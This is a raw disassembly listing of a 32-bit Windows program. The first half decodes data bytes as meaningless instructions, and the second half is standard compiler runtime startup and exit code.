  4224ea:	ret    
  4224eb:	iret   
  4224ec:	inc    ebx
  4224ed:	hlt    
  4224ee:	jp     0x422493
  4224f0:	dec    edi
  4224f1:	or     dl,ch
  4224f3:	loope  0x422530
  4224f5:	loopne 0x4224ca
  4224f7:	inc    ebx
  4224f8:	or     DWORD PTR [ebp-0x52601127],ecx
  4224fe:	(bad)  
  422500:	add    BYTE PTR [edi],bh
  422502:	shr    ch,cl
  422504:	ins    DWORD PTR es:[edi],dx
  422505:	cld    
  422506:	mov    bl,BYTE PTR [edi]
  422508:	sbb    DWORD PTR [edi-0x43c62baf],0x7f5965f5
  422512:	mov    ebx,0x6c189b26
  422517:	enter  0xc99c,0x3f
  42251b:	push   cs
  42251c:	outs   dx,BYTE PTR ds:[esi]
  42251d:	pop    ecx
  42251e:	scas   al,BYTE PTR es:[edi]
  42251f:	and    DWORD PTR [ebx+0x48],esi
  422522:	mul    BYTE PTR [ebx-0x6c]
  422525:	pop    edi
  422526:	add    al,0xe6
  422528:	int    0x2
  42252a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42252b:	add    eax,ecx
  42252d:	je     0x422551
  42252f:	adc    al,0xb8
  422531:	mov    bh,0x97
  422533:	mov    edx,DWORD PTR [ecx-0x5f4aac7]
  422539:	pop    ecx
  42253a:	(bad)  
  42253b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42253c:	sbb    BYTE PTR [ecx-0x527396a5],0x81
  422543:	data16 mov ch,0x20
  422546:	pop    esi
  422547:	xor    eax,0xb1620f1f
  42254c:	push   eax
  42254d:	mov    esi,0x5f97604b
  422552:	int    0x1f
  422554:	out    dx,al
  422555:	or     eax,ebp
  422557:	test   DWORD PTR [eax],edi
  422559:	inc    ebx
  42255a:	mov    eax,ds:0xe3fe7f10
  42255f:	stos   DWORD PTR es:[edi],eax
  422560:	jecxz  0x422565
  422562:	retf   0xf052
  422565:	pusha  
  422566:	rcl    BYTE PTR [ebx+ebp*8-0x70],0x39
  42256b:	xor    eax,DWORD PTR [eax]
  42256d:	pop    ds
  42256e:	out    dx,al
  42256f:	cmp    eax,0xe4827c34
  422574:	enter  0x61be,0xac
  422578:	les    ebp,FWORD PTR ds:0xbc8348f7
  42257e:	loope  0x42254d
  422580:	sbb    eax,0x8a163623
  422585:	mov    ds:0xf98a1c07,al
  42258a:	jbe    0x4225ab
  42258c:	mov    ah,0x54
  42258e:	and    eax,0xb5c1bda7
  422593:	cld    
  422594:	sbb    ah,BYTE PTR [ebx+0x3f]
  422597:	or     dh,bl
  422599:	mov    dl,0xb
  42259b:	sar    DWORD PTR [ecx-0x74],0xe3
  42259f:	retf   0x7792
  4225a2:	push   ebx
  4225a3:	inc    ebp
  4225a4:	xchg   ebp,eax
  4225a5:	outs   dx,DWORD PTR ds:[esi]
  4225a6:	sub    al,dl
  4225a8:	test   eax,0x40e49931
  4225ad:	and    DWORD PTR ds:0xeedbf57f,ebp
  4225b3:	add    dh,BYTE PTR [ebp+0x405f5e37]
  4225b9:	mov    al,0xc
  4225bb:	push   0x7fb3e0cf
  4225c0:	neg    BYTE PTR [ebp-0x4fee931a]
  4225c6:	les    esp,FWORD PTR [esi-0x75]
  4225c9:	cmp    eax,0x8864bbd4
  4225ce:	xor    cl,cl
  4225d0:	sbb    al,0xe
  4225d2:	ja     0x42260e
  4225d4:	mov    edx,edx
  4225d6:	lahf   
  4225d7:	stos   BYTE PTR es:[edi],al
  4225d8:	jns    0x42256b
  4225da:	mov    ds:0x7e08a120,al
  4225df:	pop    es
  4225e0:	xor    ch,BYTE PTR [esi+0x29]
  4225e3:	cmp    eax,0x7d51a6f6
  4225e8:	and    bl,BYTE PTR [edx-0x7aa2996d]
  4225ee:	adc    BYTE PTR [ebp-0x4f],ch
  4225f1:	sar    DWORD PTR [edx],0x60
  4225f4:	aam    0x7a
  4225f6:	lods   al,BYTE PTR gs:[esi]
  4225f8:	leave  
  4225f9:	sub    ebx,eax
  4225fb:	leave  
  4225fc:	jl     0x4225b5
  4225fe:	std    
  4225ff:	xor    DWORD PTR [ebp+0x71],esp
  422602:	jmp    0x4225ec
  422604:	leave  
  422605:	dec    edi
  422606:	xchg   esp,eax
  422607:	push   es
  422608:	(bad)  
  422609:	(bad)  
  42260a:	inc    eax
  42260b:	sub    eax,0xa0e2bb39
  422610:	dec    esp
  422611:	sbb    DWORD PTR [ebx+0x29],eax
  422614:	mov    esi,0xab784f85
  422619:	sub    ch,ch
  42261b:	in     al,dx
  42261c:	bound  ebp,QWORD PTR [ecx+0x18586762]
  422622:	scas   al,BYTE PTR es:[edi]
  422623:	mov    esp,0x88705dc0
  422628:	call   0xbc72:0x7a43575c
  42262f:	pusha  
  422630:	add    BYTE PTR [ebx],0xd4
  422633:	push   ss
  422634:	mov    bp,WORD PTR [esi+ecx*4]
  422638:	sub    eax,0xabd5add2
  42263d:	test   BYTE PTR [ebx],dl
  42263f:	and    BYTE PTR [eax],0xa9
  422642:	pusha  
  422643:	xchg   ebx,eax
  422644:	pop    esp
  422645:	add    DWORD PTR [edx+0x62],esp
  422648:	adc    DWORD PTR [esi+eiz*8-0x21eaa11a],eax
  42264f:	dec    esp
  422650:	inc    esp
  422651:	add    ah,cl
  422653:	mov    esi,0x6ed0ad3e
  422658:	and    DWORD PTR [eax-0x7],ebp
  42265b:	push   0x2
  42265d:	lods   eax,DWORD PTR ds:[esi]
  42265e:	(bad)  
  422660:	enter  0x9e74,0x3e
  422664:	dec    edx
  422665:	nop
  422666:	ss (bad) 
  422668:	pop    edx
  422669:	jno    0x42268d
  42266b:	inc    edi
  42266c:	dec    esp
  42266d:	(bad)  
  42266f:	dec    edx
  422670:	(bad)
  422673:	cld    
  422674:	mov    ch,ch
  422676:	jbe    0x4226ae
  422678:	(bad)  
  422679:	dec    esp
  42267a:	aaa    
  42267b:	or     dl,BYTE PTR [edx-0x3c83c214]
  422681:	fisttp WORD PTR [ebx+0x13]
  422684:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422685:	repz xlat BYTE PTR ds:[ebx]
  422687:	adc    al,0xcc
  422689:	sub    BYTE PTR [esi+ecx*2-0x46],ah
  42268d:	repz dec ebp
  42268f:	pop    eax
  422690:	fld    DWORD PTR [ebx+0x47247418]
  422696:	push   edx
  422697:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422698:	dec    ebx
  422699:	mov    ch,0x14
  42269b:	cli    
  42269c:	jno    0x4226ba
  42269e:	jmp    0x5ce5:0x4191ce03
  4226a5:	and    BYTE PTR [eax+0x62],al
  4226a8:	pop    ss
  4226a9:	push   esp
  4226aa:	sub    BYTE PTR [edx+0x5d],0x2
  4226ae:	jb     0x42271a
  4226b0:	mov    ecx,DWORD PTR [ebp+0x3c]
  4226b3:	leave  
  4226b4:	ror    BYTE PTR [edi+edx*4+0x5c5561ed],cl
  4226bb:	(bad)  
  4226bc:	mov    al,ds:0x2aa0d80c
  4226c1:	sbb    al,0xc1
  4226c3:	push   edi
  4226c4:	adc    eax,0x7ac331fc
  4226c9:	sahf   
  4226ca:	push   edx
  4226cb:	mov    edi,0x1d84fd98
  4226d0:	mov    edx,0xf229beab
  4226d5:	(bad)  
  4226d6:	(bad)  
  4226d7:	icebp  
  4226d8:	sti    
  4226d9:	fisttp DWORD PTR [ebx]
  4226db:	push   esi
  4226dc:	mov    edi,0xb308d6a6
  4226e1:	cwde   
  4226e2:	xor    al,0x3d
  4226e4:	aam    0xbd
  4226e6:	mov    esp,0x8b79c287
  4226eb:	int3   
  4226ec:	in     eax,dx
  4226ed:	push   esp
  4226ee:	enter  0x737,0x6d
  4226f2:	(bad)  
  4226f3:	in     al,dx
  4226f4:	mov    eax,0xd5bb5ccc
  4226f9:	sahf   
  4226fa:	cdq    
  4226fb:	test   BYTE PTR [esi],dl
  4226fd:	scas   al,BYTE PTR es:[edi]
  4226fe:	shl    BYTE PTR [ecx-0x54d1421],0x76
  422705:	mov    ch,dh
  422707:	cld    
  422708:	outs   dx,BYTE PTR ds:[esi]
  422709:	lock fs rcl esp,0xe9
  42270e:	jnp    0x42270b
  422710:	loopne 0x4226ff
  422712:	push   ds
  422713:	(bad)  
  422714:	out    dx,al
  422715:	adc    BYTE PTR [esi],dl
  422717:	int3   
  422718:	and    DWORD PTR [esp+esi*8-0x5a],0xa38c3b1f
  422720:	out    dx,eax
  422721:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422722:	fild   WORD PTR [esp+eax*8+0x52]
  422726:	adc    eax,0x6ba7dd0e
  42272b:	ret    0xe208
  42272e:	adc    DWORD PTR [edx],ebp
  422730:	or     ecx,DWORD PTR [esi]
  422732:	mov    eax,0x7cefbff4
  422737:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422738:	ja     0x4226e4
  42273a:	dec    eax
  42273b:	call   0x814a:0xad145631
  422742:	lock sti 
  422744:	add    BYTE PTR [edx-0x53],0xdd
  422748:	in     al,0x8f
  42274a:	jae    0x4227b2
  42274c:	xlat   BYTE PTR ds:[ebx]
  42274d:	adc    BYTE PTR [eax+0x2a],0x9d
  422751:	push   cs
  422752:	add    bl,dh
  422754:	pop    ebx
  422755:	xchg   ecx,eax
  422756:	repz sub DWORD PTR [edx+0x3c87e64d],0xcc7173a7
  422761:	gs js  0x4226e5
  422764:	mov    ebp,DWORD PTR [ebp-0x58f49a4d]
  42276a:	jns    0x422733
  42276c:	shl    BYTE PTR [ebx],0x18
  42276f:	mov    ds:0xbd5e6e6e,eax
  422774:	icebp  
  422775:	bt     DWORD PTR [eax],esi
  422778:	push   ebx
  422779:	xlat   BYTE PTR ds:[ebx]
  42277a:	scas   eax,DWORD PTR es:[edi]
  42277b:	rcr    DWORD PTR [edx+edx*2+0x8],0x7
  422780:	jne    0x42279a
  422782:	in     eax,dx
  422783:	daa    
  422784:	xor    DWORD PTR ds:0x79a30675,ebx
  42278a:	popf   
  42278b:	rol    DWORD PTR [ebx+edx*4-0x30],1
  42278f:	pop    ebp
  422790:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422791:	es out dx,al
  422793:	xor    cl,BYTE PTR [edi-0x31]
  422796:	mov    ch,0x3b
  422798:	mov    edx,0x43fe2db1
  42279d:	jp     0x4227f7
  42279f:	jae    0x4227ad
  4227a1:	mov    DWORD PTR [ebp-0x12],0xec4455d5
  4227a8:	add    edx,DWORD PTR [eax+0x43]
  4227ab:	repz shl DWORD PTR [edx],cl
  4227ae:	push   cs
  4227af:	inc    esp
  4227b0:	sub    al,BYTE PTR [esi-0x65cf6c2e]
  4227b6:	aad    0x53
  4227b8:	sub    BYTE PTR [ebx+0x55f54e8c],dl
  4227be:	xor    DWORD PTR [ecx-0x5f],edx
  4227c1:	mov    ds:0xbd2a9f86,al
  4227c6:	and    eax,0x4e9f038c
  4227cb:	cmp    al,0x9d
  4227cd:	xor    DWORD PTR [edi-0x66],ecx
  4227d0:	lahf   
  4227d1:	inc    ecx
  4227d2:	jnp    0x4227ad
  4227d4:	sub    BYTE PTR ss:[ebp+0x68d771e8],al
  4227db:	and    eax,0x8f2c74a3
  4227e0:	leave  
  4227e1:	and    edx,DWORD PTR [ecx]
  4227e3:	jl     0x4227a1
  4227e5:	sti    
  4227e6:	adc    DWORD PTR [ebp-0x4f505e9],ecx
  4227ec:	ror    DWORD PTR [eax+ebx*1+0x9],0xb5
  4227f1:	icebp  
  4227f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4227f3:	pop    es
  4227f4:	call   0x129f9860
  4227f9:	clc    
  4227fa:	sub    al,0x13
  4227fc:	cmp    dh,BYTE PTR [eax-0x75776a03]
  422802:	call   0x8803:0x9dd5a8bc
  422809:	push   0xffffffd3
  42280b:	cwde   
  42280c:	ds ins DWORD PTR es:[edi],dx
  42280e:	int    0x29
  422810:	jp     0x422890
  422812:	cwde   
  422813:	je     0x422807
  422815:	ss push ecx
  422817:	or     al,0xed
  422819:	je     0x42289a
  42281b:	xchg   BYTE PTR [ebx],ah
  42281d:	jmp    0x422873
  42281f:	sub    ebp,DWORD PTR [edx+0x5f843cea]
  422825:	xchg   ebx,eax
  422826:	cmp    eax,0x49be502d
  42282b:	in     eax,dx
  42282c:	daa    
  42282d:	fstp   st(3)
  42282f:	(bad)  
  422830:	fidivr WORD PTR [esi]
  422832:	push   ecx
  422833:	xchg   BYTE PTR [edx-0x4d],ch
  422836:	push   ebx
  422837:	mov    ebp,0xaaf98bfe
  42283c:	inc    eax
  42283d:	and    DWORD PTR [ebx+0x26f35116],ebp
  422843:	cli    
  422844:	cli    
  422845:	aam    0xdd
  422847:	clc    
  422848:	pop    esi
  422849:	add    al,0x58
  42284b:	inc    eax
  42284c:	in     al,0x6c
  42284e:	loop   0x4228a2
  422850:	mov    edx,0x68f11230
  422855:	je     0x4227e3
  422857:	aam    0x90
  422859:	or     eax,0xebb095be
  42285e:	ret    0xdac1
  422861:	arpl   WORD PTR [ebx-0x7b],bx
  422864:	in     eax,0x18
  422866:	in     eax,0x3b
  422868:	inc    ecx
  422869:	push   es
  42286a:	loopne 0x422869
  42286c:	add    ecx,edx
  42286e:	ins    DWORD PTR es:[edi],dx
  42286f:	jno    0x4227f3
  422871:	es push esp
  422873:	and    ebp,DWORD PTR [ebp+eiz*1+0x6a874821]
  42287a:	jp     0x422867
  42287c:	dec    esi
  42287d:	cli    
  42287e:	paddusb mm1,QWORD PTR ds:0xa83d95e
  422885:	out    0xe5,eax
  422887:	mov    cl,BYTE PTR [eax]
  422889:	ins    BYTE PTR es:[edi],dx
  42288a:	pop    ecx
  42288b:	in     al,dx
  42288c:	imul   ebx,edi,0xffffffff
  42288f:	mov    dl,BYTE PTR [ecx]
  422891:	jmp    0x8bda:0xbb7986bb
  422898:	dec    ebx
  422899:	out    0x39,eax
  42289b:	into   
  42289c:	pusha  
  42289d:	push   edi
  42289e:	cmp    al,0xea
  4228a0:	in     al,dx
  4228a1:	xchg   esi,eax
  4228a2:	sub    al,0x47
  4228a4:	jnp    0x422919
  4228a6:	add    ecx,DWORD PTR [esi]
  4228a8:	jns    0x42289d
  4228aa:	add    dh,0xd5
  4228ad:	les    ebx,FWORD PTR [ebx]
  4228af:	push   edx
  4228b0:	sub    esi,DWORD PTR [edi+edx*1+0x32]
  4228b4:	aam    0x74
  4228b6:	jae    0x422852
  4228b8:	rol    BYTE PTR [ecx+0x6462b6f5],1
  4228be:	pop    esp
  4228bf:	mov    ds:0x73c63664,eax
  4228c4:	mov    ecx,0x583c29d7
  4228c9:	pop    ecx
  4228ca:	jns    0x4228c9
  4228cc:	das    
  4228cd:	in     eax,0xa9
  4228cf:	sub    al,0x9c
  4228d1:	inc    ebp
  4228d2:	dec    esi
  4228d3:	mov    ebp,0x1452a633
  4228d8:	and    ebp,ebx
  4228da:	pusha  
  4228db:	jge    0x42292b
  4228dd:	(bad)  
  4228de:	cmp    dl,ah
  4228e0:	cmp    ebx,DWORD PTR [edx]
  4228e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4228e3:	mov    ch,0x6b
  4228e5:	jecxz  0x422892
  4228e7:	scas   al,BYTE PTR es:[edi]
  4228e8:	mov    cl,0x91
  4228ea:	sub    al,0x31
  4228ec:	push   0xa8c5cfb5
  4228f1:	bound  ecx,QWORD PTR [edx+eax*1]
  4228f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4228f5:	cmp    eax,0x37224080
  4228fa:	scas   eax,DWORD PTR es:[edi]
  4228fb:	dec    ebx
  4228fc:	mov    BYTE PTR [ebx],dh
  4228fe:	shr    BYTE PTR [edx],0x14
  422901:	jp     0x422971
  422903:	jae    0x422916
  422905:	pop    ds
  422906:	and    BYTE PTR ds:0x4060a91c,0xee
  42290d:	jnp    0x42289d
  42290f:	sahf   
  422910:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422911:	enter  0x5280,0xb6
  422915:	pop    ecx
  422916:	shl    eax,1
  422918:	into   
  422919:	imul   ebp,DWORD PTR [edx-0x33],0x16
  42291d:	ins    DWORD PTR es:[edi],dx
  42291e:	mov    ah,0x86
  422920:	inc    ecx
  422921:	cmc    
  422922:	cmp    BYTE PTR [esi-0x41ea4d89],al
  422928:	or     eax,0x16ba06f7
  42292d:	push   ecx
  42292e:	sub    eax,0xf192a86e
  422933:	mov    cl,0xe5
  422935:	push   ds
  422936:	ins    BYTE PTR es:[edi],dx
  422937:	or     esi,DWORD PTR [edi+0x7a087035]
  42293d:	cmc    
  42293e:	stos   BYTE PTR es:[edi],al
  42293f:	aam    0x9a
  422941:	cld    
  422942:	into   
  422943:	hlt    
  422944:	or     ebp,DWORD PTR [edx+eiz*2]
  422947:	adc    al,0x9d
  422949:	sbb    eax,0x5e9d0bb3
  42294e:	lods   eax,DWORD PTR ds:[esi]
  42294f:	aad    0xa2
  422951:	enter  0xdda8,0xc3
  422955:	cwde   
  422956:	jge    0x422990
  422958:	call   0x10c4:0x83c03346
  42295f:	ret    0x10
  422962:	nop
  422963:	nop
  422964:	nop
  422965:	nop
  422966:	nop
  422967:	nop
  422968:	nop
  422969:	nop
  42296a:	nop
  42296b:	nop
  42296c:	nop
  42296d:	nop
  42296e:	nop
  42296f:	nop
  422970:	cmp    DWORD PTR ds:0x45cabc,0x1
  422977:	jne    0x42297e
  422979:	call   0x422ebc
  42297e:	push   DWORD PTR [esp+0x4]
  422982:	call   0x422d45
  422987:	push   0xff
  42298c:	call   DWORD PTR ds:0x45c1c0
  422992:	pop    ecx
  422993:	pop    ecx
  422994:	ret    
  422995:	cmp    DWORD PTR ds:0x45cabc,0x1
  42299c:	jne    0x4229a3
  42299e:	call   0x422ebc
  4229a3:	push   DWORD PTR [esp+0x4]
  4229a7:	call   0x422d45
  4229ac:	push   0xff
  4229b1:	call   0x422b8b
  4229b6:	pop    ecx
  4229b7:	pop    ecx
  4229b8:	ret    
  4229b9:	push   0x60
  4229bb:	push   0x428118
  4229c0:	call   0x4238a8
  4229c5:	mov    edi,0x94
  4229ca:	mov    eax,edi
  4229cc:	call   0x423900
  4229d1:	mov    DWORD PTR [ebp-0x18],esp
  4229d4:	mov    esi,esp
  4229d6:	mov    DWORD PTR [esi],edi
  4229d8:	push   esi
  4229d9:	call   DWORD PTR ds:0x428028
  4229df:	mov    ecx,DWORD PTR [esi+0x10]
  4229e2:	mov    DWORD PTR ds:0x45cac4,ecx
  4229e8:	mov    eax,DWORD PTR [esi+0x4]
  4229eb:	mov    ds:0x45cad0,eax
  4229f0:	mov    edx,DWORD PTR [esi+0x8]
  4229f3:	mov    DWORD PTR ds:0x45cad4,edx
  4229f9:	mov    esi,DWORD PTR [esi+0xc]
  4229fc:	and    esi,0x7fff
  422a02:	mov    DWORD PTR ds:0x45cac8,esi
  422a08:	cmp    ecx,0x2
  422a0b:	je     0x422a19
  422a0d:	or     esi,0x8000
  422a13:	mov    DWORD PTR ds:0x45cac8,esi
  422a19:	shl    eax,0x8
  422a1c:	add    eax,edx
  422a1e:	mov    ds:0x45cacc,eax
  422a23:	xor    esi,esi
  422a25:	push   esi
  422a26:	mov    edi,DWORD PTR ds:0x428018
  422a2c:	call   edi
  422a2e:	cmp    WORD PTR [eax],0x5a4d
  422a33:	jne    0x422a54
  422a35:	mov    ecx,DWORD PTR [eax+0x3c]
  422a38:	add    ecx,eax
  422a3a:	cmp    DWORD PTR [ecx],0x4550
  422a40:	jne    0x422a54
  422a42:	movzx  eax,WORD PTR [ecx+0x18]
  422a46:	cmp    eax,0x10b
  422a4b:	je     0x422a6c
  422a4d:	cmp    eax,0x20b
  422a52:	je     0x422a59
  422a54:	mov    DWORD PTR [ebp-0x1c],esi
  422a57:	jmp    0x422a80
  422a59:	cmp    DWORD PTR [ecx+0x84],0xe
  422a60:	jbe    0x422a54
  422a62:	xor    eax,eax
  422a64:	cmp    DWORD PTR [ecx+0xf8],esi
  422a6a:	jmp    0x422a7a
  422a6c:	cmp    DWORD PTR [ecx+0x74],0xe
  422a70:	jbe    0x422a54
  422a72:	xor    eax,eax
  422a74:	cmp    DWORD PTR [ecx+0xe8],esi
  422a7a:	setne  al
  422a7d:	mov    DWORD PTR [ebp-0x1c],eax
  422a80:	push   0x1
  422a82:	call   0x423857
  422a87:	pop    ecx
  422a88:	test   eax,eax
  422a8a:	jne    0x422a94
  422a8c:	push   0x1c
  422a8e:	call   0x422995
  422a93:	pop    ecx
  422a94:	call   0x4237ce
  422a99:	test   eax,eax
  422a9b:	jne    0x422aa5
  422a9d:	push   0x10
  422a9f:	call   0x422995
  422aa4:	pop    ecx
  422aa5:	call   0x4236b7
  422aaa:	mov    DWORD PTR [ebp-0x4],esi
  422aad:	call   0x4234b9
  422ab2:	test   eax,eax
  422ab4:	jge    0x422abe
  422ab6:	push   0x1b
  422ab8:	call   0x422970
  422abd:	pop    ecx
  422abe:	call   DWORD PTR ds:0x428024
  422ac4:	mov    ds:0x45d274,eax
  422ac9:	call   0x423397
  422ace:	mov    ds:0x45cab4,eax
  422ad3:	call   0x4232f5
  422ad8:	test   eax,eax
  422ada:	jge    0x422ae4
  422adc:	push   0x8
  422ade:	call   0x422970
  422ae3:	pop    ecx
  422ae4:	call   0x4230c2
  422ae9:	test   eax,eax
  422aeb:	jge    0x422af5
  422aed:	push   0x9
  422aef:	call   0x422970
  422af4:	pop    ecx
  422af5:	call   0x422bcd
  422afa:	mov    DWORD PTR [ebp-0x20],eax
  422afd:	cmp    eax,esi
  422aff:	je     0x422b08
  422b01:	push   eax
  422b02:	call   0x422970
  422b07:	pop    ecx
  422b08:	mov    DWORD PTR [ebp-0x38],esi
  422b0b:	lea    eax,[ebp-0x64]
  422b0e:	push   eax
  422b0f:	call   DWORD PTR ds:0x428020
  422b15:	call   0x423059
  422b1a:	mov    DWORD PTR [ebp-0x68],eax
  422b1d:	test   BYTE PTR [ebp-0x38],0x1
  422b21:	je     0x422b29
  422b23:	movzx  eax,WORD PTR [ebp-0x34]
  422b27:	jmp    0x422b2c
  422b29:	push   0xa
  422b2b:	pop    eax
  422b2c:	push   eax
  422b2d:	push   DWORD PTR [ebp-0x68]
  422b30:	push   esi
  422b31:	push   esi
  422b32:	call   edi
  422b34:	push   eax
  422b35:	call   0x421800
  422b3a:	mov    edi,eax
  422b3c:	mov    DWORD PTR [ebp-0x6c],edi
  422b3f:	cmp    DWORD PTR [ebp-0x1c],esi
  422b42:	jne    0x422b4a
  422b44:	push   edi
  422b45:	call   0x422d05
  422b4a:	call   0x422d27
  422b4f:	jmp    0x422b7c
  422b51:	mov    eax,DWORD PTR [ebp-0x14]
  422b54:	mov    ecx,DWORD PTR [eax]
  422b56:	mov    ecx,DWORD PTR [ecx]
  422b58:	mov    DWORD PTR [ebp-0x70],ecx
  422b5b:	push   eax
  422b5c:	push   ecx
  422b5d:	call   0x422ef5
  422b62:	pop    ecx
  422b63:	pop    ecx
  422b64:	ret    
  422b65:	mov    esp,DWORD PTR [ebp-0x18]
  422b68:	mov    edi,DWORD PTR [ebp-0x70]
  422b6b:	cmp    DWORD PTR [ebp-0x1c],0x0
  422b6f:	jne    0x422b77
  422b71:	push   edi
  422b72:	call   0x422d16
  422b77:	call   0x422d36
  422b7c:	or     DWORD PTR [ebp-0x4],0xffffffff
  422b80:	mov    eax,edi
  422b82:	lea    esp,[ebp-0x7c]
  422b85:	call   0x4238e3
  422b8a:	ret    
  422b8b:	push   0x428134
  422b90:	call   DWORD PTR ds:0x428018
  422b96:	test   eax,eax
  422b98:	je     0x422bb0
  422b9a:	push   0x428124
  422b9f:	push   eax
  422ba0:	call   DWORD PTR ds:0x42801c
  422ba6:	test   eax,eax
  422ba8:	je     0x422bb0
  422baa:	push   DWORD PTR [esp+0x4]
  422bae:	call   eax
  422bb0:	push   DWORD PTR [esp+0x4]
  422bb4:	call   DWORD PTR ds:0x42802c
  422bba:	int3   
  422bbb:	push   0x8
  422bbd:	call   0x423a6f
  422bc2:	pop    ecx
  422bc3:	ret    
  422bc4:	push   0x8
  422bc6:	call   0x4239db
  422bcb:	pop    ecx
  422bcc:	ret    
  422bcd:	mov    eax,ds:0x45d270
  422bd2:	test   eax,eax
  422bd4:	je     0x422bd8
  422bd6:	call   eax
  422bd8:	push   esi
  422bd9:	push   edi
  422bda:	mov    ecx,0x42a00c
  422bdf:	mov    edi,0x42a018
  422be4:	xor    eax,eax
  422be6:	cmp    ecx,edi
  422be8:	mov    esi,ecx
  422bea:	jae    0x422c03
  422bec:	test   eax,eax
  422bee:	jne    0x422c2f
  422bf0:	mov    ecx,DWORD PTR [esi]
  422bf2:	test   ecx,ecx
  422bf4:	je     0x422bf8
  422bf6:	call   ecx
  422bf8:	add    esi,0x4
  422bfb:	cmp    esi,edi
  422bfd:	jb     0x422bec
  422bff:	test   eax,eax
  422c01:	jne    0x422c2f
  422c03:	push   0x4236fb
  422c08:	call   0x423b80
  422c0d:	mov    esi,0x42a000
  422c12:	mov    eax,esi
  422c14:	mov    edi,0x42a008
  422c19:	cmp    eax,edi
  422c1b:	pop    ecx
  422c1c:	jae    0x422c2d
  422c1e:	mov    eax,DWORD PTR [esi]
  422c20:	test   eax,eax
  422c22:	je     0x422c26
  422c24:	call   eax
  422c26:	add    esi,0x4
  422c29:	cmp    esi,edi
  422c2b:	jb     0x422c1e
  422c2d:	xor    eax,eax
  422c2f:	pop    edi
  422c30:	pop    esi
  422c31:	ret    
  422c32:	push   ebp
  422c33:	mov    ebp,esp
  422c35:	push   esi
  422c36:	push   edi
  422c37:	push   0x8
  422c39:	call   0x423a6f
  422c3e:	xor    esi,esi
  422c40:	inc    esi
  422c41:	cmp    DWORD PTR ds:0x45cb04,esi
  422c47:	pop    ecx
  422c48:	jne    0x422c5a
  422c4a:	push   DWORD PTR [ebp+0x8]
  422c4d:	call   DWORD PTR ds:0x428034
  422c53:	push   eax
  422c54:	call   DWORD PTR ds:0x428030
  422c5a:	cmp    DWORD PTR [ebp+0xc],0x0
  422c5e:	mov    al,BYTE PTR [ebp+0x10]
  422c61:	mov    DWORD PTR ds:0x45cb00,esi
  422c67:	mov    ds:0x45cafc,al
  422c6c:	jne    0x422cc0
  422c6e:	mov    ecx,DWORD PTR ds:0x45d268
  422c74:	test   ecx,ecx
  422c76:	je     0x422ca1
  422c78:	mov    eax,ds:0x45d264
  422c7d:	sub    eax,0x4
  422c80:	cmp    eax,ecx
  422c82:	jmp    0x422c9a
  422c84:	mov    eax,DWORD PTR [eax]
  422c86:	test   eax,eax
  422c88:	je     0x422c8c
  422c8a:	call   eax
  422c8c:	mov    eax,ds:0x45d264
  422c91:	sub    eax,0x4
  422c94:	cmp    eax,DWORD PTR ds:0x45d268
  422c9a:	mov    ds:0x45d264,eax
  422c9f:	jae    0x422c84
  422ca1:	mov    eax,0x42a01c
  422ca6:	mov    esi,0x42a020
  422cab:	cmp    eax,esi
  422cad:	mov    edi,eax
  422caf:	jae    0x422cc0
  422cb1:	mov    eax,DWORD PTR [edi]
  422cb3:	test   eax,eax
  422cb5:	je     0x422cb9
  422cb7:	call   eax
  422cb9:	add    edi,0x4
  422cbc:	cmp    edi,esi
  422cbe:	jb     0x422cb1
  422cc0:	mov    eax,0x42a024
  422cc5:	mov    esi,0x42a028
  422cca:	cmp    eax,esi
  422ccc:	mov    edi,eax
  422cce:	jae    0x422cdf
  422cd0:	mov    eax,DWORD PTR [edi]
  422cd2:	test   eax,eax
  422cd4:	je     0x422cd8
  422cd6:	call   eax
  422cd8:	add    edi,0x4
  422cdb:	cmp    edi,esi
  422cdd:	jb     0x422cd0
  422cdf:	cmp    DWORD PTR [ebp+0x10],0x0
  422ce3:	pop    edi
  422ce4:	pop    esi
  422ce5:	je     0x422cf0
  422ce7:	push   0x8
  422ce9:	call   0x4239db
  422cee:	jmp    0x422d02
  422cf0:	push   DWORD PTR [ebp+0x8]
  422cf3:	mov    DWORD PTR ds:0x45cb04,0x1
  422cfd:	call   0x422b8b
  422d02:	pop    ecx
  422d03:	pop    ebp
  422d04:	ret    
  422d05:	push   0x0
  422d07:	push   0x0
  422d09:	push   DWORD PTR [esp+0xc]
  422d0d:	call   0x422c32
  422d12:	add    esp,0xc
  422d15:	ret    
  422d16:	push   0x0
  422d18:	push   0x1
  422d1a:	push   DWORD PTR [esp+0xc]
  422d1e:	call   0x422c32
  422d23:	add    esp,0xc
  422d26:	ret    
  422d27:	push   0x1
  422d29:	push   0x0
  422d2b:	push   0x0
  422d2d:	call   0x422c32
  422d32:	add    esp,0xc
  422d35:	ret    
  422d36:	push   0x1
  422d38:	push   0x1
  422d3a:	push   0x0
  422d3c:	call   0x422c32
  422d41:	add    esp,0xc
  422d44:	ret    
  422d45:	push   ebp
  422d46:	mov    ebp,esp
  422d48:	sub    esp,0x10c
  422d4e:	mov    eax,ds:0x45c430
  422d53:	xor    eax,DWORD PTR [ebp+0x4]
  422d56:	mov    ecx,DWORD PTR [ebp+0x8]
  422d59:	push   ebx
  422d5a:	push   esi
  422d5b:	mov    DWORD PTR [ebp-0x4],eax
  422d5e:	xor    edx,edx
  422d60:	push   edi
  422d61:	xor    eax,eax
  422d63:	cmp    ecx,DWORD PTR [eax*8+0x45c1c8]
  422d6a:	je     0x422d72
  422d6c:	inc    eax
  422d6d:	cmp    eax,0x12
  422d70:	jb     0x422d63
  422d72:	mov    esi,eax
  422d74:	shl    esi,0x3
  422d77:	cmp    ecx,DWORD PTR [esi+0x45c1c8]
  422d7d:	jne    0x422ea6
  422d83:	mov    eax,ds:0x45cabc
  422d88:	cmp    eax,0x1
  422d8b:	je     0x422e81
  422d91:	cmp    eax,edx
  422d93:	jne    0x422da2
  422d95:	cmp    DWORD PTR ds:0x45c1c4,0x1
  422d9c:	je     0x422e81
  422da2:	cmp    ecx,0xfc
